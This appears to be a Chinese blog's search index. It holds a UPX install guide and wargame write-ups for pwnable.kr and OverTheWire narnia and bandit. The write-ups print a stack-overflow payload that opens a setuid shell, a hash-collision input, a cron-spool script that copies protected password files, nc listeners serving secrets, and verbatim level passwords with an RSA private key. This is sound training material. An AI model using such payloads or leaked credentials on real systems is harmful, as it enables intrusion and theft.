<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux下安装UPX</title>
    <link href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/"/>
    <url>/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/</url>
    
    <content type="html"><![CDATA[<p>upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。</p><p>本教程在 linux 下进行，理论上支持所有 linux 发型版。</p><p>安装 upx<br>upx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。</p><p>本教程的下载地址可能不是最新版请访问 <a href="https://upx.github.io" target="_blank" rel="noopener">https://upx.github.io</a> 下载最新版</p><p>下载 upx</p><blockquote><blockquote><blockquote><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz" target="_blank" rel="noopener">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p></blockquote></blockquote></blockquote><p>解压二进制</p><blockquote><blockquote><blockquote><p>tar -Jxf upx*.tar.xz</p></blockquote></blockquote></blockquote><p>为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量</p><blockquote><blockquote><blockquote><p>sudo cp upx*/upx /usr/bin</p></blockquote></blockquote></blockquote><p>然后就可以使用了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.kr解题（一）</title>
    <link href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p><pre><code>fd@pwnable:~$ cat fd.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){    if(argc&lt;2){        printf(&quot;pass argv[1] a number\n&quot;);        return 0;    }    int fd = atoi( argv[1] ) - 0x1234;    int len = 0;    len = read(fd, buf, 32);    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){        printf(&quot;good job :)\n&quot;);        system(&quot;/bin/cat flag&quot;);        exit(0);    }    printf(&quot;learn about Linux file IO\n&quot;);    return 0;}</code></pre><p>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>所以我们可以使fd == 0，然后从终端输入LETMEWIN后回车<br>要使fd == 0，<br>则：输入的参数 == 0x1234，即4660<br>flag:</p><blockquote><p>mommy! I think I know what a file descriptor is!!</p></blockquote><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>ssh <a href="mailto:col@pwnable.kr">col@pwnable.kr</a> -p2222 (pw:guest)</p><pre><code>col@pwnable:~$ cat col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){    int* ip = (int*)p;    int i;    int res=0;    for(i=0; i&lt;5; i++){        res += ip[i];    }    return res;}int main(int argc, char* argv[]){    if(argc&lt;2){        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);        return 0;    }    if(strlen(argv[1]) != 20){        printf(&quot;passcode length should be 20 bytes\n&quot;);        return 0;    }    if(hashcode == check_password( argv[1] )){        system(&quot;/bin/cat flag&quot;);        return 0;    }    else        printf(&quot;wrong passcode.\n&quot;);    return 0;}</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p><p>col@pwnable:<del>$ ./col $(python -c “print ‘\x01’ *16+ ‘\xE8\x05\xD9\x1D’”)<br>daddy! I just managed to create a hash collision :)<br>col@pwnable:</del>$ </p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><a href="https://www.jianshu.com/p/b7a2e255d243" target="_blank" rel="noopener">https://www.jianshu.com/p/b7a2e255d243</a></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>这道题需要进行脱壳首先checksec flag<br>发现它是upx加壳的。<br>下载upx<br>upx -d flag<br>用IDA打开 alt -t 搜素flag找到flag即可。</p><blockquote><p>UPX…? sounds like a delivery service :)</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>overthewire narnia解题(一)</title>
    <link href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/"/>
    <url>/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>账号：narnia0 密码：narnia0<br>SSH为narnia.labs.overthewire.orgas后narnia0，将目录更改为/narnia并运行ls -l。从输出中，我们可以看到我们具有的读取权限narnia0.c。我们还可以看到该资源narnia0归该narnia0组所有（通过运行我们可以看到它属于该组），并且我们对该组id拥有执行权限。此外，由于setuid位已设置（如的输出左侧所示），并且归所有者所有，因此我们可以看到它narnia0可以作为narnia1用户执行。从输出中我们可以看到是x86 ELF二进制文件。似乎很清楚，那就是它的源代码，我们需要利用sls -lnarnia1file narnia0narnia0narnia0.cnarnia0narnia0以某种方式编写程序，这样我们就可以运行任意命令narnia1。运行cat narnia0.c给出以下输出。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    long val=0x41414141;    char buf[20];    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);    printf(&quot;Here is your chance: &quot;);    scanf(&quot;%24s&quot;,&amp;buf);    printf(&quot;buf: %s\n&quot;,buf);    printf(&quot;val: 0x%08x\n&quot;,val);    if(val==0xdeadbeef)        system(&quot;/bin/sh&quot;);    else {        printf(&quot;WAY OFF!!!!\n&quot;);        exit(1);    }    return 0;}</code></pre><p>从代码中可以明显看出，关卡的目的是为给出打开shell val的值。我们可以看到该程序最多读取24个字节并将其放在变量中，该变量恰好是20个字节长。由于是在之后定义的，因此，用于存储值的4个字节的内存将在为20个字节保留后直接写入。因此，如果我们提供所有24个字节，它们将溢出到存储的值的存储器中。因此，我们可以控制其价值。0xdeadbeefnarnia1stdinbufbufvalvalbufval</p><p>现在，为了写入有效负载，我们需要确定所用机器的字节顺序。以下程序将使我们能够做到这一点。</p><pre><code>const int i = 1;#define is_bigendian() ( (*(char*)&amp;i) == 0)#include &lt;stdio.h&gt;int main(void) {    printf(&quot;%d\n&quot;, is_bigendian());}</code></pre><p>该is_bigendian函数将指向值1的整数指针转换为字符指针，将其取消引用并将结果与​​值0进行比较。如果系统为big-endian，则字符指针将指向最高有效位变量的字节，i为零。我们可以在的子目录中编写和编译该程序/tmp。</p><pre><code>narnia1@melinda:~$ mkdir /tmp/lukeaddisonnarnia1@melinda:~$ cd /tmp/lukeaddisonnarnia1@melinda:/tmp/lukeaddison$ nano endian.cnarnia1@melinda:/tmp/lukeaddison$ gcc endian.c -o endiannarnia1@melinda:/tmp/lukeaddison$ ./endian 0</code></pre><p>因此，我们使用的是Little-endian机器，我们的有效负载将包含字节字符串\xef\xbe\xad\xde（的反向\xde\xad\xbe\xef）。该\x符号开始一个十六进制转义序列，使我们能够编写包含任意字节的字符串常量。我们使用python回显我们的有效负载并将其通过管道传递给narnia0。</p><pre><code>narnia0@melinda:/narnia$ python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0 Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?val: 0xdeadbeefnarnia0@melinda:/narnia$</code></pre><p>发生了什么？程序的输出显示该var值等于正确的值，那么为什么我们的外壳没有打开？发生的事情是外壳确实打开了，但随后立即关闭了。这是因为python命令终止时，外壳EOF程序从管道接收到了（文件末尾），并且也终止了。为了解决这个问题，我们可以使用cat来连接python进程的输出stdin。</p><pre><code>narnia0@melinda:/narnia$ cat &lt;(python -c&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;) - | ./narnia0</code></pre><p>运行上面的命令可以使我们的Shell进程保持打开状态，并且我们键入的任何内容都会通过该cat进程发送给它。因此，我们可以将命令键入为narnia1。</p><pre><code>whoaminarnia1cat /etc/narnia_pass/narnia1efeidiedae</code></pre><h1 id="level-0-level-1"><a href="#level-0-level-1" class="headerlink" title="level 0-level 1"></a>level 0-level 1</h1><p>账号：narnial1 密码： efeideae<br>Linux export 命令用于设置或显示环境变量。<br>只要到网上找到一个可用的shellcode传入EGG变量就行了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>overthewire解题（二）</title>
    <link href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><p>用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关</p><pre><code>    bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost    Could not create directory &#39;/home/bandit13/.ssh&#39;.    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.    Are you sure you want to continue connecting (yes/no)? yes    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).    This is a OverTheWire game server. More information on http://www.overthewire.org/wargames    Linux bandit 4.18.12 x86_64 GNU/Linux      ,----..            ,----,          .---.      /   /   \         ,/   .`|         /. ./|    /   .     :      ,`   .&#39;  :     .--&#39;.  &#39; ;   .   /   ;.  \   ;    ;     /    /__./ \ : |  .   ;   /  ` ; .&#39;___,/    ,&#39; .--&#39;.  &#39;   \&#39; .  ;   |  ; \ ; | |    :     | /___/ \ |    &#39; &#39;   |   :  | ; | &#39; ;    |.&#39;;  ; ;   \  \;      :   .   |  &#39; &#39; &#39; : `----&#39;  |  |  \   ;  `      |  &#39;   ;  \; /  |     &#39;   :  ;   .   \    .\  ;    \   \  &#39;,  /      |   |  &#39;    \   \   &#39; \ |    ;   :    /       &#39;   :  |     :   &#39;  |--&quot;       \   \ .&#39;        ;   |.&#39;       \   \ ;       www. `---` ver     &#39;---&#39; he       &#39;---&quot; ire.org     Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]--  This machine might hold several wargames.   If you are playing &quot;somegame&quot;, then:    * USERNAMES are somegame0, somegame1, ...    * Most LEVELS are stored in /somegame/.    * PASSWORDS for each level are stored in /etc/somegame_pass/.  Write-access to homedirectories is disabled. It is advised to create a  working directory with a hard-to-guess name in /tmp/.  You can use the  command &quot;mktemp -d&quot; in order to generate a random and hard to guess  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled  so that users can not snoop on eachother. Files and directories with   easily guessable or short names will be periodically deleted!  Please play nice:    * don&#39;t leave orphan processes running    * don&#39;t leave exploit-files laying around    * don&#39;t annoy other players    * don&#39;t post passwords or spoilers    * again, DONT POST SPOILERS!       This includes writeups of your solution on your blog or website!--[ Tips ]--  This machine has a 64bit processor and many security-features enabled  by default, although ASLR has been switched off.  The following  compiler flags might be interesting:    -m32                    compile for 32bit    -fno-stack-protector    disable ProPolice    -Wl,-z,norelro          disable relro   In addition, the execstack tool can be used to flag the stack as  executable on ELF binaries.  Finally, network-access is limited for most levels by a local  firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations:    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/    * peda (https://github.com/longld/peda.git) in /usr/local/peda/    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/    * pwntools (https://github.com/Gallopsled/pwntools)    * radare2 (http://www.radare.org/)    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]--  For more information regarding individual wargames, visit  http://www.overthewire.org/wargames/  For support, questions or comments, contact us through IRC on  irc.overthewire.org #wargames.  Enjoy your stay!bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</code></pre><p> 密码：</p><blockquote><blockquote><blockquote><p>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</p></blockquote></blockquote></blockquote><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>用账号：bandit14，密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e进入本关</p><pre><code>bandit14@bandit:~$ nc localhost 30000Wrong! Please enter the correct current passwordbandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>BfMYroe26WYalil77FoDi9qh59eK5xNr</p></blockquote></blockquote></blockquote><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>用账号：bandit15，密码：BfMYroe26WYalil77FoDi9qh59eK5xNr进入本关</p><pre><code>bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quites_client: Option unknown option -quites_client: Use -help for summary.bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quietdepth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1BfMYroe26WYalil77FoDi9qh59eK5xNrCorrect!cluFn7wTiGryunymYOu4RcffSxQluehd</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>cluFn7wTiGryunymYOu4RcffSxQluehd</p></blockquote></blockquote></blockquote><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>用账号：bandit16，密码：cluFn7wTiGryunymYOu4RcffSxQluehd进入本关</p><pre><code>bandit16@bandit:~$ nmap -sV -A -p 31000-32000 localhost | grep open31046/tcp open  echo31518/tcp open  ssl/echo31691/tcp open  echo31790/tcp open  ssl/unknown31960/tcp open  echobandit16@bandit:~$ openssl s_client -connect localhost:31790 -quietdepth=0 CN = banditverify error:num=18:self signed certificateverify return:1depth=0 CN = banditverify return:1cluFn7wTiGryunymYOu4RcffSxQluehdCorrect!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----bandit16@bandit:~$ mkdir /tmp/rtm2bandit16@bandit:~$ nano /tmp/rtm2/sshkey[PASTE CONTENTS OF PRIVATE KEY INTO EMPTY FILE]bandit16@bandit:~$ chmod 600 /tmp/rtm2/sshkeybandit16@bandit:~$ ssh -i /tmp/rtm2/sshkey bandit17@localhost</code></pre><p>我们首先对运行在31000和32000之间的开放端口上的服务执行Nmap扫描。为了整洁，输出通过grep传递。</p><p>我们发现五个端口报告为打开，其中三个报告其服务为回声。不是我们感兴趣的内容。我们还发现有两个ssl服务正在侦听，但是其中一个也在运行echo。</p><p>我们尝试与端口31790建立连接，输入先前的密码，然后返回并返回似乎是bandit17的ssh私钥！</p><p>在使用它访问bandit17之前，我们首先需要在/ tmp中创建一个新目录。使用nano（或您喜欢的文本编辑器）在其中创建一个新的文本文件，并将ssh私钥的内容粘贴到空文件中。</p><p>如果从现在开始尝试使用刚才创建的ssh密钥文件登录bandit17，将会遇到错误。在没有首先使用’chmod’锁定ssh密钥文件的权限的情况下，我们将返回“ Unprotected Private Key File！”警告。将权限修改为600将解决此问题。</p><h1 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h1><p>bandit17@bandit:~$ diff passwords.old passwords.new<br>42c42<br>&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</p><hr><pre><code>&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Ydbandit17@bandit:~$ </code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>用账号：bandit18，密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd进入本关</p><p>描述：下一级别的密码存储在家庭目录中的文件自述文件中。不幸的是， 当你使用SSH登录时，有人修改了.bashrc将你注销。</p><p>过程：</p><pre><code>  Enjoy your stay!  Byebye !  Connection closing...Socket close.      bandit17@bandit:~$ ssh bandit18@localhost cat readmeThe authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargames@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/home/bandit17/.ssh/id_rsa&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;/home/bandit17/.ssh/id_rsa&quot;: bad permissionsbandit18@localhost&#39;s password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</code></pre><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><p>用账号：bandit19，密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x进入本关</p><pre><code>bandit19@bandit:~$ ls     bandit20-dobandit19@bandit:~$ ls -l bandit20-do -rwsr-x--- 1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-dobandit19@bandit:~$ ./bandit20-do Run a command as another user.  Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ ./bandit20-do whoamibandit20bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j        </code></pre><p>一步一步就知道这个文件的作用以及用法</p><p>密码：</p><blockquote><blockquote><blockquote><p>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p></blockquote></blockquote></blockquote><h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><p>用账号：bandit20，密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j进入本关</p><p>描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它在您指定为命令行参数的端口上连接到localhost。然后它从连接中读取一行文本，并将其与前一级别的密码（bandit20）进行比较。如果密码正确，它将传输下一级密码（bandit21）。</p><p>注意：尝试连接到您自己的网络守护程序，以查看它是否按照您的想法工作，这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。</p><p>过程：</p><p>首先使用nc 监听一个端口，并推送/etc/bandit_pass/bandit20文件内容，即bandit20的密码</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20</code></pre><p>此时2333端口处于监听状态，再建立一个ssh连接</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect 2333Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0jPassword matches, sending next password</code></pre><p>成功读取到文件以后，就把下一关的密码发送到监听端口</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</code></pre><p>成功获得密码 。</p><p>密码：</p><blockquote><blockquote><blockquote><p>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p></blockquote></blockquote></blockquote><h1 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h1><p>用账号：bandit21，密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>过程：</p><pre><code>bandit21@bandit:~$ cd /etc/cron.d/bandit21@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x   2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contestbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI</code></pre><p>cron指Linux系统下一个自动执行指定任务的程序（计划任务），” bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null” 中的”“表示每分钟执行一次这个脚本，再用cat查询该脚本的内容，不停把/etc/bandit_pass/bandit22文件内容（即下一关的密码）写入/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv，并且更改了权限。</p><p>密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p><h1 id="level-22"><a href="#level-22" class="headerlink" title="level 22"></a>level 22</h1><p>用账号：bandit22，密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本有意使其易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看它打印的调试信息。</p><p>过程：</p><pre><code>bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x   2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contestbandit22@bandit:/etc/cron.d$ cat -n cronjob_bandit23     1    @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null     2    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh # !/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &#39; &#39; -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</code></pre><p>直接赋值执行。</p><p>密码：</p><blockquote><p>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p></blockquote><h1 id="level-23"><a href="#level-23" class="headerlink" title="level 23"></a>level 23</h1><p>用账号：bandit23，密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>注意：此级别要求您创建自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到自豪！</p><p>注2：请记住，你的shell脚本一旦被执行就被删除，所以你可能想保留一份副本……</p><p>过程：</p><pre><code>bandit23@bandit:~$ cd /etc/cron.dbandit23@bandit:/etc/cron.d$ lscronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contestbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];    then    echo &quot;Handling $i&quot;    timeout -s 9 60 ./$i    rm -f ./$i    fidonebandit23@bandit:/etc/cron.d$ mkdir /tmp/crayon   bandit23@bandit:/etc/cron.d$ cd /tmp/crayonbandit23@bandit:/tmp/crayon$ vim bandit24.shbandit23@bandit:/tmp/crayon$ cat bandit24.sh #!/bin/bashcat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/crayon/level24bandit23@bandit:/tmp/crayon$ chmod 777 bandit24.sh bandit23@bandit:/tmp/crayon$ cp bandit24.sh /var/spool/bandit24/bandit23@bandit:/tmp/crayon$ chmod 777 /tmp/crayonbandit23@bandit:/tmp/crayon$ ls /var/spool/bandit24/ls: cannot open directory &#39;/var/spool/bandit24/&#39;: Permission deniedbandit23@bandit:/tmp/crayon$ 